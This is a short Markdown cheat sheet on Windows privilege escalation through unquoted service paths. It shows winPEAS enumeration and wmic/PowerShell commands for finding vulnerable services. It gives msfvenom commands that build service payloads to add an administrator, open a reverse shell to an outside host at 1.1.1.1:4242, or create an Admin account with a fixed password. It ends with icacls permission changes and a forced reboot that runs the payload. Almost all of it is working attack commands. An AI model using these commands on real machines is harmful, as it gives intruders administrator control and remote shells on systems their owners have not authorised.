# Privilege escalation

## Summary
* [Automate enumeration](#automate-enumeration-for-privilege-escalation)
* [Unquoted service paths exploitation](#unquoted-service-paths-for-privilege-escalation)

## Automate enumeration for privilege escalation
```
winpeasx64.exe
```
## Unquoted service paths for privilege escalation
#### List all unquoted service paths
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch "`"" -and $_PathName -inotmatch ":\\Windows\\" }| select name,pathname
```
#### Generate a payload
```
msfvenom -p windows/exec CMD='net localgroup administrators sage /add' -f exe-service -o Devservice.exe (upgrade a user to privileged user)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=4242 -f exe-service -o Devservice.exe (reverse shell)
msfvenom -p windows/adduser USER=Admin PASS=Admin123 -f exe-service -o Devservice.exe (add user to admin group) 
```
#### Change the file permission
```
icacls 'C:\Program Files\Devservice.exe' /grant Everyone:F
```
#### Since the service is 'Auto-Starts', restarting the machine will run the payload
```
shutdown /r /t 0
Restart-Computer
```
